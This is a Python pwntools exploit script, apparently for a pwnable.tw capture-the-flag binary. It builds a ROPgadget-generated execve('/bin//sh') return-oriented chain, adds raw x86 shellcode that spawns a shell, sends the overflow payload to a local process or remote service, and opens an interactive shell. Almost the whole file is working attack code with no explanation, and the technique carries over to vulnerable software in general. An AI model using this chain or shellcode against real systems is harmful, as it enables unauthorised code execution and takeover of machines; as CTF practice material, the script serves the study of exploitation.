#-*- coding:utf-8 -*-
from pwn import *
#!/usr/bin/env python2
	# execve generated by ROPgadget

from struct import pack

	# Padding goes here
def rop():
	p = ''

	p += pack('<I', 0x0806f2ea) # pop edx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080b85b6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x08054ceb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f2ea) # pop edx ; ret
	p += pack('<I', 0x080eb064) # @ .data + 4
	p += pack('<I', 0x080b85b6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x08054ceb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f2ea) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x08049653) # xor eax, eax ; ret
	p += pack('<I', 0x08054ceb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080d643d) # pop ecx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x0806f2ea) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x08049653) # xor eax, eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0804f3ce) # inc eax ; ret
	p += pack('<I', 0x0806cf63) # int 0x80
	return p



Debug = True
if Debug:
	io = process("./bin14")
else:
	io = remote("chall.pwnable.tw","10001")
gdb.attach(io,"b *0x08048C44")
jmp_esp = 0x080ace3c
jmp_ebx = 0x0805c664
sc =     "\x31\xc0\x50\x68\x2f\x2f\x73"
sc +=    "\x68\x68\x2f\x62\x69\x6e\x89"
sc +=    "\xe3\x89\xc1\x89\xc2\xb0\x0b"
sc +=    "\xcd\x80\x31\xc0\x40\xcd\x80"
sc2 = asm("sub esp,8;jmp esp")
print len(sc)
char_num = 0x10
payload = "aaaabbbb" + "ccccdddd" + "junk" + rop() + sc
io.sendlineafter("）",payload)
io.sendlineafter("）",sc)
#0x8fc40e1

io.interactive()

